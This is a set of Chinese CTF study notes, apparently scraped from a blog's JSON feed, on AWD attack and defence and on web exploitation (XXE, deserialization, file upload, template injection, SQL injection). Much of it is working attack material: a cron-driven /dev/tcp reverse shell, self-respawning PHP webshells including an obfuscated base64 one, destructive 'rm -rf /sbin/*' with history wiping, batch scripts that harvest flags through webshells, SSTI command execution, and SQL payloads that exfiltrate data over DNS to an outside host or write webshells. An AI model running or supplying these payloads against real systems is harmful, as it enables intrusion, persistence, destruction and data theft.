./rm -rf /sbin/* ./rm -rf /usr/bin/* cd /etc/tmp/b history -c # 禁用cd 命令enable -n cd enable -n echo enable -n history\n\n把系统命令移走后，清空历史命令记录然后将cd等内建命令禁用\n攻击权限维持/后门技术定时任务反弹shell在/etc/networkt下写入反弹shell\nvim /etc/networkt写入bash -i &gt;&amp; /dev/tcp/LHOST/PROT 0&gt;&amp;1\n\n赋予执行权限\nchmod +x /etc/networkt\n\n写入/etc/crontab 或者 crontab -e \n*/1 * * * * root /etc/networkt\n\n不死马 &lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = './.index.php';    $code = '&lt;?php if(md5($_POST[\"pass\"])==\"361a8e7255c308e4362fff2ca3e726ff\")&#123;@eval($_POST[a]);&#125; ?&gt;';       while (1)&#123;        file_put_contents($file,$code);        usleep(5000);    &#125;?&gt;\n\n//马儿用法：POST::?pass=fany&amp;a=command\n\n&lt;?php   file_put_contents('.1ndex.php',base64_decode('PD9waHAgIAogICAgc2V0X3RpbWVfbGltaXQoMCk7ICAKICAgIGlnbm9yZV91c2VyX2Fib3J0KDEpOyAgCiAgICB1bmxpbmsoX19GSUxFX18pOyAgCiAgICB3aGlsZSgxKXsgIAogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcubG5kZXgucGhwJywnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTAxNjBjMmVjNGY0MGQ3M2Y5MDYxZjg5NjcxMjExNTciKXtAZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+Jyk7ICAKICAgICAgICBzbGVlcCgwKTsgIAogICAgfQo/Pg=='));?&gt;\n\nget：pass=ocean888@.cnpost：cmd=system(“ls”);\n\nlinux命令不死马while true;do echo &apos;&lt;?php eval($_POST[&quot;x&quot;]);?&gt;&apos; &gt; x.php;sleep 1;done\n\n过盾一句话&lt;?php $a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);print_r(`$a`)?&gt;\n\n可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用\n&lt;?php $a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);$k=(`$a`);header(&apos;cookie:&apos;.$k);?&gt;$a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);$k=(`$a`);header(&apos;cookie:&apos;.$k);\n\n批量GETflag方法模板\nimport requestimport redef getFlag(url):    resp = request.get(url)    flag = re.search(flag匹配规则, resp.text)    return flagdef main():    # ip池    ipList = [100,101,102]    # payload    payload = ''    # flag存储    flagList = []    # 遍历    try:        for i in ipList:            url = \"192.168.1.\"+str(i)+payload            flag = getFlag(url)            print(url, flag)            flagList.append(flag)    except:        pass                print(flagList)if __name__ == '__main__':    main()\n\n核心的两句话\nres = request.get(url+payload)flag = re.findall(r\"flag&#123;.+&#125;\", res.text)\n\n批量获取提交flag脚本import requestsimport reimport time# 请求def request(url):    print(url)    resp = requests.get(url)    return resp.text# 获取flagdef getFlag(html):    flag = re.search(\"flag&#123;[.*&#125;\",html).group()    return flag# 提交flagdef submib_Flag(ip,flag):    url = \"http://172.15.91.101/lms/portal/sp/hz_flag.php\"  # flag提交地址    data = &#123;\"melee_ip\":\"\",\"melee_flag\":\"\"&#125;    data['melee_ip'] = ip # 靶机ip    data['melee_flag'] = flag # 该靶机上flag    print(flag)    header = &#123;\"cookie\":\"SSCSum=1; lms_login_name=cqipc1; zlms-sid=ruf8d3qk28iqtooa52fbsmke01; webcs_test_cookie=lms_cookie_checker\"&#125;    resp = requests.post(url,data=data,headers=header)    #print(len(resp.text))    # 返回页面提示    if \"您已提交过当前IP和FLAG，请确认！\" in resp.text:        print(\"\\033[1;33m已提交过\\033[0m\")    elif  \"您提交得FLAG错误，请继续努力\" in resp.text:        print(\"\\033[1;31m提交错误\\033[0m\")    elif \"恭喜您答对了\" in resp.text:        print(\"\\033[1;32m提交成功\\033[0m\")    elif len(resp.text) == 1744:        print(\"\\033[1;31;30m未登录\\033[0m\")        exit()    # 暂停10s    time.sleep(10)def main():        for ip in range(101,109):            try:                ip = \"172.20.\"+str(ip)+\".101\"                print(\"This:\"+ip)                # 第一个flag                url_payload1 = \"http://\"+ip+\"/W3bShell/webshell.php?a=cat /flag.txt\"                submib_Flag(ip,getFlag(request(url_payload1)))                # 第二个flag                url_payload2 = \"http://\"+ip+\"/W3bShell/webshell.php?a=cat /var/www/admin/flag2.txt\"                submib_Flag(ip,getFlag(request(url_payload2)))            except:                passif __name__ == '__main__':    main()\n\nweb漏洞获取flag写批量提交的条件\n\n知道赛场所有靶机ip地址知道获取flag的payload\n\npayload种类：命令执行\ncat /flag.txt\n\n代码执行(用下面方式 弥补 命令执行带参数命令 不能回显的缺陷)\n@eval(base64_decode($_GET[z0]));&amp;z0=c3lzdGVtKCdjYXQgL2ZsYWcudHh0Jyk7\n\n文件包含\n?file=../../../flag.txt\n\nssh获取flagshell写批量登录ssh脚本拿flag的条件\n\n知道所有靶机ip地址知道ssh密码知道flag位置\n\n监控\n注意权限问题：那些尽量选用低权限能用的\n\ntail命令监控日志tail -f [日志文件]\n\nctf@4ef271a9a03b:/tmp$ tail -f log.txt 访问链接：/index.php?请求方法：GETCookie: Array()POST: --------------end-----------------\n\n日志/流量监控\n流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量\n被上马一定要先备份到本地，再删除、去分析反打别人\n\n网上搜集脚本\nphp\nlog.php\n&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER[\"REMOTE_ADDR\"];//记录访问者的ip$filename = $_SERVER['PHP_SELF'];//访问者要访问的文件名$parameter = $_SERVER[\"QUERY_STRING\"];//访问者要请求的参数$method = $_SERVER['REQUEST_METHOD'];//请求方法$time = date('Y-m-d H:i:s',time());//访问时间$post = file_get_contents(\"php://input\",'r');//接收POST数据$logadd = \"访问者IP：\".$ip.\"\\r\\n\".'访问时间：'.$time.\"\\r\\n\".'访问链接：'.$filename.'?'.$parameter.\"\\r\\n\".\"请求方法：\".$method.\"\\r\\n\";$others    = \"POST: \".$post.\"\\r\\n\";// log记录$fh = fopen(\"/tmp/log.txt\", \"a\");fwrite($fh, \"-------------start----------------\\r\\n\");fwrite($fh, $logadd);fwrite($fh,\"Cookie: \\r\\n\".print_r($_COOKIE, true).\"\\r\\n\");fwrite($fh,$others.\"\\r\\n\");fwrite($fh, \"--------------end-----------------\\r\\n\");fclose($fh);?&gt;\n\n# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once \"/tmp/waf.php\";?&gt;find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i&lt;?php require_once \"/tmp/log.php\";?&gt;'\n\n\n问题：不能监控linux隐藏文件的访问， 比如 .index.php 访问这个文件就检测不到。\n\n文件监控\n注意：被上马一定要先备份到本地，再删除、去分析反打别人\n\n网上收集脚本\nhttps://www.shuzhiduo.com/A/GBJrKlDG50/\n使用方法\n\n上传到靶机/tmp目录下\n\nctf@4ef271a9a03b:/tmp/FileMonitor-master$ python main.py      _____________   &lt; FileMonitor &gt;    -------------      /\\_)o&lt;     |       |      | O . O |      \\_____/    By CoolCat      [08:36:56]:Please enter a directory:/var/www/html/[08:37:01]:FileMonitor is running...[08:37:07]:修改了/var/www/html/.a.php Hash为：41f12630a50703b6026654e2de8cada1[08:37:07]:删除了/var/www/html/.a.php[08:37:15]:新建了/var/www/html/.a.php\n\n\n\n监控目录\n/var/www/html/\n\n\n问题：垃圾日志太多\n\nweblogger（不熟悉暂且不用）一个针对php的web流量抓取、分析的应用。\n使用方法\ncd /var/www/html/ (or other web dir)git clone https://github.com/wupco/weblogger.gitchmod -R 777 weblogger/open http://xxxxx/weblogger/install.php in Web browserinstall it\n\n进程/端口监控(不熟悉暂且不用)网上收集脚本\n部署waf\nwaf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在\n\n\n每个文件前边加 require_once(waf.php);\n改 .user.ini配置文件 auto_prepend_file=; 包含在文件头auto_append_file=; 包含在文件尾\n\n\n注：如果挂了waf出现持续扣分，waf去掉\n\n有root权限\n1.\n#每个文件前边加 require_once(waf.php);find /var/www/html -type f -path \"*.php\" | xargs sed -i \"s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g\"find /var/www/html -type f -path \"*.php\" | xargs sed -i \"s/&lt;?php/&lt;?php include_once(\\\"\\/var\\/www\\/html\\/waf.php\\\");/g\"上waf：$ find . -path ./waffffff -prune -o -type f -name \"*.php\" -print | xargs sed -i \"s/&lt;?php/&lt;?php include_once(\\\"\\/var\\/www\\/html\\/waffffff\\/waf.php\\\");/g\"下waf：$ find . -path ./waffffff -prune -o -type f -name \"*.php\" -print | xargs sed -i \"s/&lt;?php include_once(\\\"\\/var\\/www\\/html\\/waffffff\\/waf.php\\\");/&lt;?php/g\"\n\n2.\nvim php.iniauto_append_file = \"/dir/path/phpwaf.php\"重启Apache或者php-fpm就能生效了。\n\n3.\n改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;;  包含在文件头auto_append_file=&lt;filename&gt;;  包含在文件尾php_value auto_prepend_file \"/dir/path/phpwaf.php\"\n\n注：如果挂了waf出现持续扣分，waf去掉\n只有user权限\n没写系统权限就只能在代码上面下手了，也就是文件包含。\n这钟情况又可以用不同的方式包含。\n1.\n如果是框架型应用，那麽就可以添加在入口文件，例如index.php，\n如果不是框架应用，可以在公共配置文件config.php等相关文件中包含。\ninclude('phpwaf.php');\n\n2.\n替换index.php，也就是将index.php改名为index2.php，然后讲phpwaf.php改成index.php。\n当然还没完，还要在原phpwaf.php中包含原来的index.php\nindex.php -&gt; index2.phpphpwaf.php -&gt;index.phpinclude('index2.php');\n\n\n修改权限mysqll用户读表权限上传目录是否可执行的权限\n\n部署文件监控脚本php.ini\nauto_prepend_file = waf.php的路径;\n\nrequire_once(&apos;waf.php&apos;);常用cms添加waf位置PHPCMS V9 \\phpcms\\base.phpPHPWIND8.7 \\data\\sql_config.phpDEDECMS5.7 \\data\\common.inc.phpDiscuzX2   \\config\\config_global.phpWordpress   \\wp-config.phpMetinfo   \\include\\head.php\n\n\n\n其他通用waf\nhttps://github.com/DasSecurity-HatLab/AoiAWD\n","categories":["CTF","CTF做题姿势总结"],"tags":["总结","CTF-AWD"]},{"title":"CTF-Web【XXE】漏洞做题姿势积累","url":"/2021/10/22/CTF-Web%E3%80%90XXE%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做XXE类题目的做题姿势，会不断更新。\n\nXXE（外部实体注入）就是引入外部的xml文件来进行利用\nPayload一个读取flag 的payload&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY penson SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;\n\n报错原因Warning：DOMDocument::loadXML(): XML declaration allowed only at the start of the document in Entity,传入的xml语句中前面包含空格\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-Web【反序列化】漏洞做题姿势积累","url":"/2021/10/24/CTF-Web%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做反序列化类题目的做题姿势，会不断更新。\n\n反序列化考点\n字符串逃逸\nPOP构造链\n反序列化做题姿势\n首先 正常创建类 有方法调用方法 总之要得到想要的内容\n\n其次 对创建的类进行序列化 并打印出序列化的内容 需要绕过就更改里面的内容\n\n最后 把序列化后的内容 进行提交 有需要编码 就进行编码\npop链构造做题姿势\n\nphar反序列化的三个前提条件&gt; 可以上传phar文件\n\n有可以利用的魔术方法\n文件操作函数的参数可控\n\n1、找到可利用的地方，比如，文件包含，命令执行等地方2、从可以利用地方回溯到可控制的地方，找到一个链条。3、更改属性内容，先进行序列化，看看能不能达到目的。4、能够达到目的，才进行反序列化，进行提交 有需要编码 就进行编码\n魔法方法PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：\n1. __construct()，类的构造函数\n\n2. __destruct()，类的析构函数\n\n3. __call()，在对象中调用一个不可访问方法时调用\n\n4. __callStatic()，用静态方式中调用一个不可访问方法时调用\n\n5. __get()，获得一个类的成员变量时调用\n\n6. __set()，设置一个类的成员变量时调用\n\n7. __isset()，当对不可访问属性调用isset()或empty()时调用\n\n8. __unset()，当对不可访问属性调用unset()时被调用。\n\n9. __sleep()，执行serialize()时，先会调用这个函数\n\n10. __wakeup()，执行unserialize()时，先会调用这个函数\n\n11. __toString()，类被当成字符串时的回应方法\n\n12. __invoke()，调用函数的方式调用一个对象时的回应方法\n\n13. __set_state()，调用var_export()导出类时，此静态方法会被调用。\n\n14. __clone()，当对象复制完成时调用\n\n15. __autoload()，尝试加载未定义的类\n\n16. __debugInfo()，打印所需调试信息phar反序列化利用可以代替unserialize 进行反序列化操作的函数fileatime\tfilectimefile_existsfile_get_contentsfile_put_contentsfilefilegroupfopenfileinodefilemtimefileownerfikepermsis_diris_executableis_fileis_linkis_readableis_writableis_writeableparse_ini_filecopyunlinkstatreadfile\n\n注意：生成phar文件//生成phar文件前需要配置php.ini\n[Phar]; http://php.net/phar.readonlyphar.readonly = On 改成 Off\n\n创建对象 exp.phar 是文件名$phar = new Phar(&apos;exp.phar&apos;);$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ?&gt;&apos;);$phar-&gt;setMetadata($c1);// 要压缩的文件$phar-&gt;addFromString(&apos;exp.txt&apos;,&apos;test&apos;);$phar-&gt;stopBuffering();\n\n特性\n 在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞绕过_wakeup魔法方法\n绕过方法：只需要将对象属性数量设置比原本的要大即可\n\n\n 利用php&gt;7.1版本对类属性的检测不严格(对属性类型不敏感)\n意味着 序列化的时候可以将portected属性换成public属性\n\nPrivate 权限%00类名%00属性名Protected 权限%00*%00属性名\n\n绕过字符过滤s 换成 S 属性值就可以为十六进制\n反序列化原生类的利用http://www.wangqingzheng.com/anquanke/82/238482.html\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-Web【文件上传】漏洞做题姿势积累","url":"/2021/10/22/CTF-Web%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。\n\n文件上传可解析后缀asp/aspx\nasp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr\n\nphp\nphp,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml\n\njsp\njsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml\n\n中间件解析漏洞iis\n1.IIS6.0文件解析xx.asp;.jpg（服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了）2.IIS6.0目录解析xx.asp/1.jpg (服务器默认会把.asp，.asa目录下的文件都解析成asp文件。)3.IIS 7.0畸形解析 xxx.jpg/x.asp\n\napache\n1.%0a(CVE-2017-15715)（apache 2.4.0 - 2.4.29）更多姿势https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html2.未知后缀 test.php.xxx（Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断）\n\nnginx\n访问连接加/xxx.php test.jpg/.php (跟版本没有关系 属于配置不当)畸形解析漏洞 test.jpg%00.phpCVE-2013-4547（Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7）test.jpg(非编码空格)\\0x.php www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php另外一种手法：上传一个名字为test.jpg，以下内容的文件。&lt;?PHPfputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?phpeval($_POST[cmd])?&gt;&apos;);?&gt;然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。\n\ntomcat（仅限windows）\nxxx.jsp/xxx.jsp%20xxx.jsp::$DATA\n\n绕过 xif_imagetype()方式添加gif文件头\nGIF89a\n截断上传漏洞%00截断上传\nphp版本&lt;5.3.4\nwindows系统解析漏洞绕过1、上传1.php(或者图片马)，抓包改为1.php.\n2、上传1.php(或者图片马)，抓包改为1.php::$DATA\n3、上传1.php(或者图片马)，抓包改为1.php:1.jpg\n4、上传1.php(或者图片马)，抓包改为1.php::$DATA…….\n小技巧\n利用.user.ini文件进行上传前提是当前上传的目录存在php文件\n\n\n上传.htaccess  (Apache)\n\n更多\nhttps://websec.readthedocs.io/zh/latest/vuln/fileupload.html\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-Web【模板注入】漏洞做题姿势积累","url":"/2021/10/22/CTF-Web%E3%80%90%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做模板注入类题目的做题姿势，会不断更新。\n\n\n\njinja2函数和属性__class__    返回调用的参数类型__bases__    返回基类列表__mro__        此属性是在方法解析期间寻找基类时的参考类元组__subclasses__()    返回子类的列表__globals__        以字典的形式返回函数所在的全局命名空间所定义的全局变量__builtins__        内建模块的引用，在任何地方都是可见的(包括全局)，每个python脚本都会自动加载。\n\n读取文件payload&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('文件名/文件路径','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;  c.__init__.__globals__['__builtins__'].open('文件名/文件路径','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag.txt').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n查看指定路径下所有文件&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\nSmarty执行命令&#123;system(&apos;ls /&apos;)&#125;\n\n查看smarty版本号&#123;$smarty.version&#125;\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-Web【SQL注入】漏洞做题姿势积累","url":"/2021/11/15/CTF-Web%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做SQL注入类题目的做题姿势，会不断更新。\n\n判断注入常用的的方式&apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1 &amp;&amp; 1=1 #1^0 #    // 显示异常 则存在注入1^1 #     // 显示正常，可能存在注入1&apos; or 3&gt;2 --1&apos; or 3&lt;2 --%DF&apos; union select 1,2,3 -- - // 宽字节注入\n\n延时注入检测payloadadmin&apos; AND (SELECT 4792 FROM (SELECT(SLEEP(5)))Nttm) AND &apos;fJzs&apos;=&apos;fJzs\n\n1 and (select 6583 from (select(sleep(5)))SjTQ)\n\n过滤绕过等于号被过滤and=`&amp;&amp;`  or=`||`   xor=`|`   not=`!`&lt;&gt; likeinbetween andregexp\n\n$sql = select * from user where id=1;使用in方法绕过使用示例：$sql = select * from user where id in (1);使用like 绕过$sql = select * from user Where id like 5\n\n逗号绕过select substr(database() from 1 for 1);select mid(database() from 1 for 1);select * from news limit 0,1# 等价于下面这条SQL语句select * from yang limit 1 offset 0union select 1,2等价于union select * from (select 1)a join (select 2)bselect ascii(mid(user(),1,1))=80   #等价于select user() like 'r%'select * from news limit 0,1等价于select * from news limit 1 offset 0\n\n空格被过滤，替代方法%09 TAB键（水平）%0a 新建一行%0b TAB键（垂直）%0c 新的一页%0d return 功能%a0 空格%20 空格()&lt;&gt;/**/\n\n可用注释符--+#%23;%00,&apos;1\n\n使用等价函数绕过关键字被过滤编码双写绕过大小写绕过...\n\nhex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1\n\nord 被过滤ascii\npreg_match 绕过数组绕过\n绕过addslashes转义宽字节注入\n%DF&apos; union select 1,2,3 -- -�&apos; union select 1,2,3 -- -ï¿½&apos; union select 1,2,3 --\n\ninformation_schemab.tables   被过滤替代表\nmysql.innodb_table_statstable_schema 换成 database_name\n\n注意：MySQL5.6以上才有 sys 库\nsys.x$schema_table_statistics（只能查表名，查不到列名）表名：table_name    数据库：table_schema\n\nsys.schema_auto_increment_columns（可获取表名和库名）表名：table_name 数据库：table_schema\n\nsys.schema_table_statistics_with_buffer（可获取表名）表名：table_name 数据库：table_schema\n\n注入语法sqllit注入查找表名和列名-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4;-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4 -- -1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4/*聚合的方式-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4;-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4 -- -1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4/*查数据-1&apos; union select 1,2,(select group_concat(username,password) from users),4;-1&apos; union select 1,2,(select group_concat(username,password) from users),4 -- -1&apos; union select 1,2,(select group_concat(username,password) from users),4/*\n\n异或注入语法判断1^1^1    // 11^0^1    // 0\n\n猜测表名1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1\n\n猜测列名1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;表名&apos;)),1,1))&gt;0)^1\n\n猜测值1^(ord(substr((select(group_concat(列名))from(表名)),1,1))&gt;0)^1\n\n报错注入语法and extractvalue(1, concat(0x7e, (语句)))\n\nand updatexml(1, concat(0x7e, (语句), 0x7e), 1)\n\n0x7e可代替的字符有：’~’    ‘$’\nupdatexml的concat可以代替的函数有：make_set\nupdate报错注入select group_concat(password) from (select * from users)b\n\n表名可控注入control=users where updatexml(1,concat(0x5e24,(user()),0x5e24),1) --+&amp;id=1\n\n布尔盲注语法猜数据库名长度and (length(database())=%d --+\n\n猜数据库名and (ord(mid(database(),%d,1))=&apos;%s&apos;) --+\n\n猜数据库中所有表数量and %d=(select count(table_name) from information_schema.tables where table_schema=database())--+\n\n猜数据库中单个表长度and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+\n\n猜数据库单个表名and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+\n\n猜表中字段数量and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos; and table_schema=database())--+\n\n猜表中单个字段长度and (select length(column_name) from information_schema.columns where table_name=&apos;%s&apos; and table_schema=database()  limit %d ,1)=%d --+\n\n猜表中单个字段名and ord(mid((select column_name from information_schema.columns where table_name=&apos;%s&apos; and table_schema=database() limit %d,1),%d,1))=%d --+\n\n猜表中字段名的字段值数量and (select count(%s) from %s )=%d --+\n\n猜表中字段名的字段值长度and (select length(%s) from %s limit %d,1)=%d --+\n\n猜表中字段名的字段值and ord(mid((select %s from %s limit %d,1),%d,1))=%d --+\n\n时间盲注语法and if(条件语句, sleep(3), 1)\n\n时间盲注函数sleep()benchmark()\n时间盲注&amp;dnslog的利用\n使用DnsLog盲注仅限于windos环境\n\n查数据库\nSELECT LOAD_FILE(CONCAT('\\\\\\',(select database(),'mysql.cmr1ua.ceye.io\\\\abc')))\n\nhttp://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\\\\\',(select database()),'.cmr1ua.ceye.io\\\\abc'))--+\n\n查表名\nhttp://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.cmr1ua.ceye.io\\\\abc'))--+\n\n查字段\n' and load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.cmr1ua.ceye.io\\\\abc'))--+\n\n查数据\n' and load_file(concat('\\\\\\\\',(select password from users limit 0,1),'.cmr1ua.ceye.io\\\\abc'))--+' and load_file(concat('\\\\\\\\',(select username from users limit 0,1),'.cmr1ua.ceye.io\\\\abc'))--+\n\n\n注意：因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去\n\n' and load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.cmr1ua.ceye.io\\\\abc'))--+\n\n参考：https://www.cnblogs.com/xhds/p/12322839.html\ndns平台：http://ceye.io/records/dns\n无列名注入（只知道表名的情况下查询数据）子查询绕过(select `2` from (select 1,2,3 union select * from table_name)a)  //前提是要知道表名\n\n((select c from (select 1,2,3 as c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量\n\njoin爆破列名?id=-1&apos; union all select * from (select * from users as a join users as b)as c--+//as主要作用是起别名，就是把users表当做a表，常规来说as可以省略\n\n?id=-1&apos; union all select*from (select * from users as a join users as b using(id,username))as c--+\n\n逐字符检索数据这里的select 1 是对应字段的位置  比如 id username password 1 就对应id  2就对应 username 3就对应 password\nmysql&gt; select (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1)           |+------------------------------------------------------------+|                              0                             |+------------------------------------------------------------+mysql&gt; select (select 1,&apos;d&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1)           |+------------------------------------------------------------+|                              1                             |+------------------------------------------------------------+//说明第二个字段的第一位是c,以此类推mysql&gt; select (select 1,&apos;cm&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1)           |+------------------------------------------------------------+|                              0                             |+------------------------------------------------------------+\n\nregexp注入order by 盲注查看表内容未完全显示的方法not in 排除的方式显示table_name=&apos;users&apos; and table_schema=database() and column_name not in (&quot;username&quot;))))#&amp;passwd=12\n\nleft   right 截断的方式显示select(group_concat(left(password,25)))select(group_concat(right(password,25)))\n\n正则直接匹配test&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x7e),1)#\n\nreserver逆序输出test&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;))),0x7e),1)#\n\n字符串截取函数left(str,index) 从左边第index开始截取right(str,index) 从右边第index开始截取substring(str,index) 从左边index开始截取mid(str,index,len) 截取str 从index开始,截取len的长度lpad(str,len,padstr) rpad(str,len,padstr) 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果ord\n\n#### \nsql注入getshell写入一句话union select 1,2,&apos;一句话木马&apos; into outfile &quot;绝对路径&quot;\n\nunion select 1,@@basedir,@@datadir  查看网站路径\n\n读取文件union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4 %23\n\n特殊知识点的解决方法$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";if (!empty($row) &amp;&amp; $row['password']===md5($password))&#123;&#125;\n\nusername=admin&apos; union select 